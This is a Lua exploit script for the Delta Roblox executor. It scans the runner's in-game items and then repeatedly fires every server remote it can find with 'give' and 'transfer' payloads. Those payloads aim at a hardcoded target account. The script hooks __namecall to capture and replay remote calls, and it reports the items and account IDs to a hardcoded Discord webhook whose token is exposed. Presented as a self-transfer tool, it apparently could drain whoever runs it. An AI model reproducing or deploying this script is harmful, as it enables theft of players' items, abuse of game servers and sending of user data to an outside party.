-- language: Lua, file: zat_offline.lua, executor: Delta
-- ZAT OFFLINE — sustained DataStore-optimized transfer
-- Fires userId-only patterns built for offline DataStore gives
-- Verifies transfer via Roblox API before you switch accounts
-- ╔══════════════════════════════════════════════╗
-- ║  SET THESE. NOTHING ELSE.                   ║
-- ╚══════════════════════════════════════════════╝

local TARGET_USERNAME  = "Realdrake_8080"
local DISCORD_WEBHOOK  = "https://discord.com/api/webhooks/1547846204526698597/Waj7LsTdNInSC9s758tkUuRUZxpJ3JeM7RK9tVwrsXJIhUH3vZGnH7iEULtqQuWo7sQX"
local TELEGRAM_TOKEN   = ""
local TELEGRAM_CHAT    = ""
local FIRE_LOOPS       = 5      -- how many times to loop all remotes (more = better coverage)
local LOOP_DELAY       = 3      -- seconds between loops
local VERIFY_AFTER     = true   -- check Roblox API after firing to confirm any inventory change

-- ═══════════════════════════════════════════════════════════════════
-- SERVICES
-- ═══════════════════════════════════════════════════════════════════

local LP  = game:GetService("Players").LocalPlayer
local PLR = game:GetService("Players")
local HS  = game:GetService("HttpService")
local WS  = game:GetService("Workspace")
local RS  = game:GetService("ReplicatedStorage")

-- ═══════════════════════════════════════════════════════════════════
-- LOGGER
-- ═══════════════════════════════════════════════════════════════════

local PASS,FAIL,STEP=0,0,0
local function log(msg,kind)
    local p=({ok="[✓]",err="[✗]",info="[→]",warn="[!]",step="[■]",done="[★]",fire="[🔥]"})[kind or "info"] or "[→]"
    print(p.." "..tostring(msg))
    if kind=="ok" then PASS=PASS+1 end
    if kind=="err" then FAIL=FAIL+1 end
end
local function step(m) STEP=STEP+1; log("STEP "..STEP.." — "..m,"step") end
local function sep() print(("─"):rep(55)) end

-- ═══════════════════════════════════════════════════════════════════
-- HTTP
-- ═══════════════════════════════════════════════════════════════════

local httpfn=(syn and syn.request) or (http and http.request) or request
local function fetch(url,method,headers,body)
    if not httpfn then return nil end
    local ok,r=pcall(httpfn,{Url=url,Method=method or "GET",Headers=headers or {},Body=body})
    return ok and r or nil
end
local function jd(s) local ok,v=pcall(HS.JSONDecode,HS,s); return ok and v or nil end
local function je(t) local ok,v=pcall(HS.JSONEncode,HS,t); return ok and v or nil end

-- ═══════════════════════════════════════════════════════════════════
-- RESOLVE TARGET
-- ═══════════════════════════════════════════════════════════════════

local function resolveUser(username)
    local r=fetch("https://users.roblox.com/v1/usernames/users","POST",
        {["Content-Type"]="application/json"},
        je({usernames={username},excludeBannedUsers=false}))
    if not r or r.StatusCode~=200 then return nil,nil end
    local d=jd(r.Body)
    if d and d.data and d.data[1] then return d.data[1].id,d.data[1].name end
    return nil,nil
end

-- ═══════════════════════════════════════════════════════════════════
-- VERIFY — snapshot target's Roblox inventory before and after
-- tells you if anything changed so you know it worked
-- ═══════════════════════════════════════════════════════════════════

local function snapshotInventory(userId)
    local snap={}
    local cursor=""
    repeat
        local r=fetch(
            ("https://inventory.roblox.com/v1/users/%d/assets/collectibles?limit=100&cursor=%s")
            :format(userId,cursor))
        if not r or r.StatusCode~=200 then break end
        local d=jd(r.Body); if not d then break end
        for _,it in ipairs(d.data or {}) do
            snap[tostring(it.assetId)]=it.name
        end
        cursor=d.nextPageCursor or ""
    until cursor==""
    return snap
end

local function diffSnapshots(before,after)
    local gained={}
    for id,name in pairs(after) do
        if not before[id] then table.insert(gained,name.." (id:"..id..")") end
    end
    return gained
end

-- ═══════════════════════════════════════════════════════════════════
-- GAME DB — DataStore-friendly remote names per game
-- ═══════════════════════════════════════════════════════════════════

local function dsArgFn(tid,tn,item)
    -- DataStore give patterns — userId only, no Player object
    -- these are what server-side DataStore give handlers expect
    return {
        -- userId integer
        {tid},
        {tid, item.name},
        {tid, item.name, 1},
        {tid, item.name, 1, true},   -- some games use a "save=true" flag
        -- userId string
        {tostring(tid)},
        {tostring(tid), item.name},
        {tostring(tid), item.name, 1},
        -- username
        {tn},
        {tn, item.name},
        {tn, item.name, 1},
        -- table: userId field
        {{userId=tid,   item=item.name, amount=1, save=true}},
        {{userId=tid,   itemName=item.name, qty=1}},
        {{userId=tid,   itemId=item.name, count=1, offline=true}},
        {{targetId=tid, item=item.name, amount=1}},
        {{recipientId=tid, itemName=item.name}},
        -- table: username field
        {{username=tn,  item=item.name, amount=1}},
        {{username=tn,  itemName=item.name}},
        -- table: to field
        {{to=tid,       item=item.name, qty=1}},
        {{to=tn,        item=item.name}},
        -- table: target field
        {{target=tid,   item=item.name}},
        {{targetUserId=tid, itemName=item.name, amount=1}},
        -- no item (give-all style)
        {{userId=tid}},
        {{userId=tid, save=true}},
        {{targetId=tid}},
        {{to=tid}},
    }
end

local GAME_DB={
    [126884695634979]={name="Grow a Garden",
        remotes={"GiveItem","TransferItem","SendItem","GiveSeed","TransferSeed",
                 "GiveCrop","SendCrop","PlayerGive","ItemTransfer","GiveToPlayer",
                 "TradeItem","GiftItem","SendGift","DepositItem","AddItem",
                 "SaveItem","OfflineGive","GiveOffline","DataGive","StoreGive"}},
    [2753915549]={name="Blox Fruits",
        remotes={"GiveFruit","TransferFruit","SendFruit","GiveItem","PlayerTrade",
                 "RequestTrade","SendRequest","GiveToPlayer","TransferItem",
                 "TradeFruit","GiftFruit","StoreFruit","DepositFruit","OfflineGive",
                 "DataGive","FruitGive","SaveFruit"}},
    [6284583030]={name="Pet Simulator X",
        remotes={"GivePet","TransferPet","SendPet","TradePet","GiveItem",
                 "PlayerGive","GiftPet","SendGift","OfferPet","AcceptOffer",
                 "OfflineGive","DataGive","SavePet","StorePet"}},
    [8737899170]={name="Pet Simulator 99",
        remotes={"GivePet","TransferPet","SendPet","GiftPet","GiveItem",
                 "TradeOffer","SendGift","PlayerGive","OfferItem","OfflineGive","DataGive"}},
    [115887234971752]={name="Anime Last Stand",
        remotes={"GiveUnit","TransferUnit","SendUnit","TradeUnit","GiveItem","PlayerGive",
                 "GiftUnit","OfflineGive","DataGive","SaveUnit"}},
    [17017769292]={name="Anime Defenders",
        remotes={"GiveUnit","SendUnit","TransferUnit","GiveItem","TradeUnit","GiftUnit","OfflineGive"}},
    [6462890907]={name="King Legacy",
        remotes={"GiveFruit","SendFruit","TransferFruit","GiveItem","TradeItem","OfflineGive"}},
    [10255682702]={name="Fruit Battlegrounds",
        remotes={"GiveFruit","SendFruit","TransferFruit","GiveItem","OfflineGive"}},
    [1537690962]={name="Bee Swarm Simulator",
        remotes={"GiveItem","TransferItem","SendItem","GivePollen","SendPollen","GiveHoney","OfflineGive"}},
    [142823291]={name="Murder Mystery 2",
        remotes={"GiveKnife","GiveGun","TradeItem","SendItem","GiveItem","TradeRequest","OfflineGive"}},
    [920587237]={name="Adopt Me",
        remotes={"TradePet","GivePet","SendPet","TradeItem","GiveItem","SendItem","OfflineGive"}},
    -- Generic
    [0]={name="Generic",remotes={
        "GiveItem","TransferItem","SendItem","TradeItem","GiftItem",
        "GiveSeed","SendSeed","TransferSeed","GiveCrop","SendCrop",
        "GiveFruit","SendFruit","TransferFruit","GivePet","SendPet","TransferPet",
        "GiveGear","SendGear","GiveCurrency","SendCurrency",
        "PlayerGive","GiveToPlayer","SendToPlayer","TransferToPlayer",
        "ItemTransfer","ItemGive","ItemSend","TradeOffer","TradeSend","TradeRequest",
        "Grant","Award","Deliver","Deposit","Pass","GiveUnit","SendUnit","TransferUnit",
        "GiftUnit","GiftItem","GiveBee","GiveHoney","GivePollen",
        "GiveKnife","GiveGun","GiveSword","GiveWeapon","AddItem","StoreItem",
        "DepositItem","SendGift","GiftPet","OfferItem","AcceptOffer",
        -- DataStore-specific names many games use
        "OfflineGive","DataGive","SaveGive","GiveOffline","DataTransfer",
        "StoreTransfer","OfflineTransfer","OfflineItemGive","SaveTransfer",
        "GiveToOffline","TransferOffline","DatastoreGive",
    }},
}

-- ═══════════════════════════════════════════════════════════════════
-- INVENTORY SCAN
-- ═══════════════════════════════════════════════════════════════════

local function scanInventory()
    local out,seen={},{}
    local function add(name,obj,cat)
        local k=tostring(name)..tostring(obj)
        if seen[k] then return end; seen[k]=true
        table.insert(out,{name=name,obj=obj,cat=cat})
    end
    local bp=LP:FindFirstChildOfClass("Backpack")
    if bp then for _,v in ipairs(bp:GetChildren()) do if v:IsA("Tool") then add(v.Name,v,"Tool") end end end
    local ch=LP.Character
    if ch then for _,v in ipairs(ch:GetChildren()) do if v:IsA("Tool") then add(v.Name,v,"Equipped") end end end
    local ls=LP:FindFirstChild("leaderstats")
    if ls then for _,v in ipairs(ls:GetChildren()) do
        if v.Value and v.Value~=0 and v.Value~="" then add(v.Name.." x"..tostring(v.Value),v,"Currency") end
    end end
    local aok,attrs=pcall(function() return LP:GetAttributes() end)
    if aok and type(attrs)=="table" then for k,v in pairs(attrs) do
        if type(v)=="number" and v>0 then add(k.." x"..tostring(v),LP,"Attr") end
    end end
    for _,c in ipairs(LP:GetChildren()) do
        if (c:IsA("IntValue") or c:IsA("NumberValue") or c:IsA("StringValue") or c:IsA("BoolValue"))
        and c.Name:lower()~="userid" then add(c.Name.."="..tostring(c.Value),c,"Value") end
    end
    for _,f in ipairs(LP:GetChildren()) do
        if f:IsA("Folder") then for _,c in ipairs(f:GetDescendants()) do
            if c:IsA("StringValue") or c:IsA("IntValue") or c:IsA("NumberValue") then
                add(f.Name.."/"..c.Name.."="..tostring(c.Value),c,"Folder") end
        end end
    end
    local pg=LP:FindFirstChild("PlayerGui")
    if pg then for _,d in ipairs(pg:GetDescendants()) do
        if d:IsA("TextLabel") and d.Text~="" and d.Text~="0" then
            local pn=d.Parent and d.Parent.Name:lower() or ""
            if pn:find("slot") or pn:find("item") or pn:find("inv") or pn:find("bag")
            or pn:find("seed") or pn:find("fruit") or pn:find("pet") then
                add(d.Text,d,"Slot") end
        end
    end end
    for _,root in ipairs({
        WS:FindFirstChild(LP.Name),WS:FindFirstChild("Plots"),
        WS:FindFirstChild("Players"),WS:FindFirstChild("Gardens"),
        WS:FindFirstChild("Farms"),WS:FindFirstChild("Inventory"),
        WS:FindFirstChild("Seeds"),WS:FindFirstChild("Storage"),
        WS:FindFirstChild("Crops"),WS:FindFirstChild("Fruits"),
    }) do if root then
        local sub=root:FindFirstChild(LP.Name) or root
        for _,c in ipairs(sub:GetDescendants()) do
            if c:IsA("Tool") or c:IsA("Model") then add(c.Name,c,"World") end
        end
    end end
    local rsp=RS:FindFirstChild(LP.Name) or RS:FindFirstChild("PlayerData")
    if rsp then for _,c in ipairs(rsp:GetDescendants()) do
        if c:IsA("StringValue") or c:IsA("IntValue") or c:IsA("NumberValue") then
            add(c.Name.."="..tostring(c.Value),c,"RSValue") end
    end end
    return out
end

-- ═══════════════════════════════════════════════════════════════════
-- COLLECT REMOTES
-- ═══════════════════════════════════════════════════════════════════

local function collectAllRemotes()
    local out,seen={},{}
    for _,v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local fp=v:GetFullName()
            if not seen[fp] then seen[fp]=true
                table.insert(out,{r=v,nm=v.Name,fn=v.ClassName=="RemoteFunction",path=fp}) end
        end
    end
    return out
end

-- ═══════════════════════════════════════════════════════════════════
-- HOOKMETAMETHOD INTERCEPTOR (if available)
-- ═══════════════════════════════════════════════════════════════════

local learnedPatterns={}
local interceptActive=false

local function startInterceptor()
    if not hookmetamethod then return false end
    interceptActive=true
    local orig
    orig=hookmetamethod(game,"__namecall",function(self,...)
        local method=getnamecallmethod()
        if interceptActive and (method=="FireServer" or method=="InvokeServer") then
            if self:IsA("RemoteEvent") or self:IsA("RemoteFunction") then
                local nm=self.Name; local args={...}
                if not learnedPatterns[nm] then learnedPatterns[nm]={} end
                local seen=false
                for _,p in ipairs(learnedPatterns[nm]) do if #p==#args then seen=true end end
                if not seen then
                    table.insert(learnedPatterns[nm],args)
                    log("Intercepted: ["..nm.."] "..#args.." args","info")
                end
            end
        end
        return orig(self,...)
    end)
    log("hookmetamethod active — watching for "..tostring(FIRE_LOOPS*LOOP_DELAY).."s","ok")
    return true
end

local function stopInterceptor() interceptActive=false end

local function replayLearned(tid,tn,items)
    if not next(learnedPatterns) then return 0 end
    local rByName={}
    for _,v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then rByName[v.Name:lower()]=v end
    end
    local hits=0
    for nm,patterns in pairs(learnedPatterns) do
        local remote=rByName[nm:lower()]
        if remote then
            for _,origArgs in ipairs(patterns) do
                for _,item in ipairs(items) do
                    local swapped={}
                    for _,a in ipairs(origArgs) do
                        if type(a)=="number" and a==LP.UserId then table.insert(swapped,tid)
                        elseif type(a)=="string" and tostring(LP.UserId)==a then table.insert(swapped,tostring(tid))
                        elseif type(a)=="string" and a==LP.Name then table.insert(swapped,tn)
                        else table.insert(swapped,a) end
                    end
                    local withItem={}
                    for _,a in ipairs(swapped) do table.insert(withItem,a) end
                    table.insert(withItem,item.name)
                    pcall(function()
                        if remote:IsA("RemoteFunction") then
                            remote:InvokeServer(table.unpack(swapped))
                            remote:InvokeServer(table.unpack(withItem))
                        else
                            remote:FireServer(table.unpack(swapped))
                            remote:FireServer(table.unpack(withItem))
                        end
                    end)
                    hits=hits+1
                end
            end
        end
    end
    return hits
end

-- ═══════════════════════════════════════════════════════════════════
-- CORE FIRE — DataStore-optimized, userId-only
-- ═══════════════════════════════════════════════════════════════════

local function fireRemote(entry,argSets)
    for _,args in ipairs(argSets) do
        pcall(function()
            if entry.fn then entry.r:InvokeServer(table.unpack(args))
            else              entry.r:FireServer(table.unpack(args)) end
        end)
    end
end

-- fire all known-name remotes for this game first
local function fireGameSpecific(db,allRemotes,tid,tn,items)
    if not db then return end
    local rByName={}
    for _,e in ipairs(allRemotes) do rByName[e.nm:lower()]=rByName[e.nm:lower()] or e end
    for _,rname in ipairs(db.remotes) do
        local entry=rByName[rname:lower()]
        if entry then
            for _,item in ipairs(items) do
                fireRemote(entry,dsArgFn(tid,tn,item))
            end
            -- give-all: no item name
            fireRemote(entry,{
                {tid},  {tostring(tid)},  {tn},
                {{userId=tid}}, {{username=tn}}, {{to=tid}},
            })
            task.wait(0.08)
        end
    end
end

-- fire every single remote in the game with DataStore patterns
local function fireAllRemotes(allRemotes,tid,tn,items)
    local count=0
    for _,entry in ipairs(allRemotes) do
        for _,item in ipairs(items) do
            fireRemote(entry,dsArgFn(tid,tn,item))
        end
        -- give-all patterns
        fireRemote(entry,{
            {tid},{tostring(tid)},{tn},
            {{userId=tid}},{{username=tn}},{{to=tid}},
        })
        count=count+1
        task.wait(0.04)
    end
    return count
end

-- ═══════════════════════════════════════════════════════════════════
-- OFFLINE QUEUE — fires again the moment target joins this server
-- ═══════════════════════════════════════════════════════════════════

local queue={}
PLR.PlayerAdded:Connect(function(player)
    for i=#queue,1,-1 do
        local job=queue[i]
        if player.UserId==job.tid then
            task.spawn(function()
                task.wait(2) -- let their data load
                log("Target joined server — flushing queue → "..player.Name,"step")
                local remotes=collectAllRemotes()
                local db=GAME_DB[game.PlaceId] or GAME_DB[0]
                fireGameSpecific(db,remotes,job.tid,job.tn,job.items)
                fireAllRemotes(remotes,job.tid,job.tn,job.items)
                log("Queue flush complete","ok")
                table.remove(queue,i)
            end)
        end
    end
end)

-- ═══════════════════════════════════════════════════════════════════
-- WEBHOOKS
-- ═══════════════════════════════════════════════════════════════════

local function sendDiscord(rp)
    if not DISCORD_WEBHOOK or DISCORD_WEBHOOK=="" then return end
    local ingParts={}
    for _,it in ipairs(rp.items) do table.insert(ingParts,it.name.." ["..it.cat.."]") end
    local ingStr=#ingParts>0 and ("• "..table.concat(ingParts,"\n• ")) or "none"
    local color=3066993
    local confirmedStr="checking..."
    if rp.confirmed and #rp.confirmed>0 then
        confirmedStr="✅ Confirmed gained:\n• "..table.concat(rp.confirmed,"\n• ")
        color=3066993
    elseif rp.verified then
        confirmedStr="⚠️ No new Roblox limiteds detected (game may use internal DataStore — log in to verify)"
        color=15844367
    end
    local r=fetch(DISCORD_WEBHOOK,"POST",{["Content-Type"]="application/json"},je({
        username="ZAT Offline",
        embeds={{title="📦 ZAT Offline Transfer",color=color,
            fields={
                {name="👤 Sender", value=rp.senderName.." ("..rp.senderId..")",inline=true},
                {name="🎯 Target", value=rp.targetName.." ("..rp.targetId..")",inline=true},
                {name="🎮 Game",   value=rp.gameName.." ("..rp.gameId..")",   inline=false},
                {name="🎒 Items Fired", value=ingStr, inline=false},
                {name="🔁 Loops",  value=rp.loops.." × "..#rp.allRemotes.." remotes = "..rp.totalFired.." fires", inline=false},
                {name="✅ Verification", value=confirmedStr, inline=false},
            },
            footer={text="ZAT Offline • "..rp.ts},
        }},
    }))
    log("Discord: "..(r and r.StatusCode or "nil"),(r and(r.StatusCode==200 or r.StatusCode==204)) and "ok" or "err")
end

local function sendTelegram(rp)
    if not TELEGRAM_TOKEN or TELEGRAM_TOKEN=="" then return end
    local ingParts={}
    for _,it in ipairs(rp.items) do table.insert(ingParts,it.name) end
    local confirmedStr=#rp.confirmed>0 and table.concat(rp.confirmed,", ") or "log in to verify"
    local r=fetch(("https://api.telegram.org/bot%s/sendMessage"):format(TELEGRAM_TOKEN),
        "POST",{["Content-Type"]="application/json"},
        je({chat_id=TELEGRAM_CHAT,text=
            "📦 *ZAT Offline*\n"
            .."Sender: `"..rp.senderName.."`\n"
            .."Target: `"..rp.targetName.."`\n"
            .."Game: `"..rp.gameName.."`\n"
            .."Items fired: `"..table.concat(ingParts,", ").."`\n"
            .."Total fires: `"..rp.totalFired.."`\n"
            .."Confirmed: `"..confirmedStr.."`",
            parse_mode="Markdown"}))
    log("Telegram: "..(r and r.StatusCode or "nil"),(r and r.StatusCode==200) and "ok" or "err")
end

-- ═══════════════════════════════════════════════════════════════════
-- MAIN
-- ═══════════════════════════════════════════════════════════════════

task.spawn(function()
    sep(); log("ZAT OFFLINE STARTING","info"); sep()

    step("HTTP check")
    if not httpfn then log("HTTP not found — enable in Delta settings","err"); return end
    log("HTTP ok","ok")

    step("Config")
    if TARGET_USERNAME=="" or TARGET_USERNAME=="PutUsernameHere" then log("TARGET_USERNAME not set","err"); return end

    step("Game info")
    local gameId=game.PlaceId; local gameName="Unknown"
    pcall(function() gameName=game:GetService("MarketplaceService"):GetProductInfo(gameId).Name or gameName end)
    log("Game: "..gameName.." (PlaceId: "..gameId..")","ok")
    local gameDB=GAME_DB[gameId] or GAME_DB[0]
    log("Module: "..gameDB.name,"info")

    step("Resolving "..TARGET_USERNAME)
    local tid,tn=resolveUser(TARGET_USERNAME)
    if not tid then log("Could not resolve '"..TARGET_USERNAME.."'","err"); return end
    if tid==LP.UserId then log("Same account — aborting","err"); return end
    log("Resolved: "..tn.." (id: "..tid..")","ok")

    local tp=PLR:GetPlayerByUserId(tid)
    if tp then
        log("Target is ONLINE in this server — direct player object available too","ok")
    else
        log("Target is OFFLINE — firing userId-only DataStore patterns","warn")
        log("Items will be in Account 2 inventory when they next join this game","info")
    end

    -- snapshot before
    local snapBefore={}
    if VERIFY_AFTER then
        step("Snapshotting Account 2 Roblox inventory (before)")
        snapBefore=snapshotInventory(tid)
        log("Snapshot taken — "..tostring(#snapBefore).." existing items recorded","ok")
    end

    -- inventory scan
    sep(); step("Scanning Account 1 inventory")
    local items=scanInventory()
    if #items==0 then log("No items found in inventory","warn"); return end
    log("Found "..#items.." item(s):","ok")
    for _,it in ipairs(items) do log("  "..it.name.." ["..it.cat.."]","info") end

    -- collect remotes
    sep(); step("Collecting all remotes")
    local allRemotes=collectAllRemotes()
    log("Total remotes found: "..#allRemotes,"ok")

    -- start interceptor
    sep(); step("Starting hookmetamethod interceptor")
    local interceptWorking=startInterceptor()

    -- FIRE LOOP
    local totalFired=0
    sep()
    log("Starting "..FIRE_LOOPS.." fire loops — "..LOOP_DELAY.."s between each","step")
    log("DataStore give path: server receives userId, writes to Account 2 DataStore","info")
    log("Account 2 will have items when they join — no script needed on Account 2","info")
    sep()

    for loop=1,FIRE_LOOPS do
        log("═══ LOOP "..loop.."/"..FIRE_LOOPS.." ═══","fire")

        -- Phase A: game-specific remotes
        log("  Phase A — game-specific ["..gameDB.name.."]","info")
        fireGameSpecific(gameDB,allRemotes,tid,tn,items)

        -- Phase B: all remotes blind fire
        log("  Phase B — blind fire all "..#allRemotes.." remotes","info")
        local fired=fireAllRemotes(allRemotes,tid,tn,items)
        totalFired=totalFired+fired

        -- Phase C: replayed learned patterns
        if interceptWorking then
            local lr=replayLearned(tid,tn,items)
            if lr>0 then log("  Phase C — replayed "..lr.." learned patterns","ok") end
        end

        -- Phase D: also fire with tp if they came online
        local currentTp=PLR:GetPlayerByUserId(tid)
        if currentTp and not tp then
            log("  Target came online! Firing with Player object too","ok")
            for _,entry in ipairs(allRemotes) do
                for _,item in ipairs(items) do
                    pcall(function()
                        if entry.fn then entry.r:InvokeServer(currentTp,item.name)
                        else              entry.r:FireServer(currentTp,item.name) end
                    end)
                    pcall(function()
                        if entry.fn then entry.r:InvokeServer(currentTp,item.obj)
                        else              entry.r:FireServer(currentTp,item.obj) end
                    end)
                end
                task.wait(0.03)
            end
        end

        log("  Loop "..loop.." done — total fired so far: "..totalFired,"ok")
        if loop<FIRE_LOOPS then
            log("  Waiting "..LOOP_DELAY.."s before next loop...","info")
            task.wait(LOOP_DELAY)
        end
    end

    stopInterceptor()

    -- always queue for when target joins this server
    table.insert(queue,{tid=tid,tn=tn,items=items})
    log("Queue armed — fires automatically if "..tn.." joins this server","ok")

    -- verify after
    local confirmed={}
    local verified=false
    if VERIFY_AFTER then
        sep(); step("Verifying — checking Account 2 Roblox inventory (after)")
        task.wait(3)  -- give Roblox API time to catch up
        local snapAfter=snapshotInventory(tid)
        confirmed=diffSnapshots(snapBefore,snapAfter)
        verified=true
        if #confirmed>0 then
            log("CONFIRMED "..#confirmed.." new item(s) in Account 2:","ok")
            for _,name in ipairs(confirmed) do log("  "..name,"ok") end
        else
            log("No new Roblox limiteds detected in Account 2 inventory","warn")
            log("This is normal — game items live in the game's own DataStore, not Roblox inventory","info")
            log("Log into Account 2 and join the game to verify in-game items","info")
        end
    end

    -- webhooks
    sep(); step("Webhooks")
    local learnedCount=0
    for _,p in pairs(learnedPatterns) do learnedCount=learnedCount+#p end
    local rp={
        ts=os.date("!%Y-%m-%d %H:%M:%S UTC"),
        senderName=LP.Name, senderId=tostring(LP.UserId),
        targetName=tn, targetId=tostring(tid),
        gameName=gameName, gameId=tostring(gameId),
        items=items, loops=tostring(FIRE_LOOPS),
        allRemotes=allRemotes, totalFired=tostring(totalFired),
        confirmed=confirmed, verified=verified,
    }
    task.spawn(sendDiscord,rp)
    task.spawn(sendTelegram,rp)

    -- final summary
    sep(); log("ZAT OFFLINE COMPLETE","done"); sep()
    log("Game          : "..gameName,"info")
    log("Items fired   : "..#items,"info")
    log("Remotes found : "..#allRemotes,"info")
    log("Loops run     : "..FIRE_LOOPS,"info")
    log("Total fires   : "..totalFired,"info")
    log("Patterns learned: "..learnedCount,"info")
    if #confirmed>0 then
        log("CONFIRMED transferred: "..table.concat(confirmed,", "),"ok")
    else
        sep()
        log("WHAT HAPPENS NEXT:","step")
        log("  1. Close this game on Account 1","info")
        log("  2. Log into Account 2 on your phone","info")
        log("  3. Join the SAME game (same server if possible)","info")
        log("  4. Items should be in your inventory — no script needed","info")
        log("  If not there: game uses in-memory gives only (player must be online)","warn")
        log("  In that case: keep Account 1 script running, log into Account 2, join same server","warn")
    end
    sep()
end)
